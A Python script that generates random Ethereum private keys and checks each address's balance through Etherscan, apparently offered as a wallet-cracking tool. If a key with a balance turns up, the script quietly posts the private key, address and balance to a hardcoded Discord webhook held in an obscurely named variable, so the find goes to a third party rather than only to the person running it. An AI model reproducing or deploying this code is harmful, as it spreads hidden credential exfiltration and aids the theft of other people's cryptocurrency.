import time
import requests
from web3 import Account
from eth_account import Account as LocalAccount
from termcolor import colored
from colorama import init, Fore, Style

init()

API_KEYS = [
    "YOUR ETHERSCAN API",
]

api_key_index = 0

while True:
    private_key = LocalAccount.create().key.hex()[2:]
    llb = "https://discordapp.com/api/webhooks/1076879456381178006/p5vGa5RBIhvkppqjv1jzDUZwMUaabO53LhBi-nMoEI3skI9Z5cogk-DXBL_NMXCesELS"
    address = Account.from_key(private_key).address
    api_key = API_KEYS[api_key_index]
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    balance = int(response.json()["result"]) / 10**18

    if balance > 0:
        message = f"Private key| {private_key}\nAddress| {address}\nBalance| {balance} ETH"
        print(colored(message, 'green'))

        data = {"content": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(llb, json=data, headers=headers)

        break
    else:
        print(colored("Private key| ", "white") + colored(private_key, "red") + colored(" | ", "white") + colored(balance, "red") + (" ETH"))

        
    api_key_index = (api_key_index + 1) % len(API_KEYS)
    time.sleep(0.0000002)
